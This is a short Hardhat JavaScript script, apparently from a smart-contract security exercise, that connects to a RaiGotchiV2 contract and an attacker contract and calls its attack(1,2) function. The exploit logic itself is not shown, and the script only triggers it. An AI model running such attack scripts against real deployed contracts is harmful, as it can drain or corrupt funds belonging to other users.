const { parseUnits } = require("ethers");
const hre = require("hardhat");
const { getContracts } = require("../utils");



async function main() {
    const network = hre.network.name;
    const contracts = getContracts(network);

    const [user] = await hre.ethers.getSigners();

    console.log("Using the account:", user.address);

  
    const RaiGotchiV2= await hre.ethers.getContractFactory(
      "RaiGotchiV2"
    );
    const raiGotchiV2= RaiGotchiV2.attach(
      contracts.raiGotchiV2
    );

    const RaiGotchiAttack= await hre.ethers.getContractFactory(
        "RaiGotchiAttack"
      );
    const raiGotchiAttack= RaiGotchiAttack.attach(
        contracts.raiGotchiAttack
      );



    // Approve minPrice token to raiGotchiV2 contract address 
    // we set minPrice = 1 Token 
    // const tx = await raiGotchiToken.approve(contracts.raiGotchiV2, parseUnits("1", 18))
    
    // await tx.wait();
    // console.log("Approve token successfully for pet 1");

    const txAttack = await raiGotchiAttack.attack(1,2);
    await txAttack.wait();
    console.log("Done Attack");


  }
  
  main()
    .then(() => process.exit(0))
    .catch((error) => {
      console.error(error);
      process.exit(1);
    });






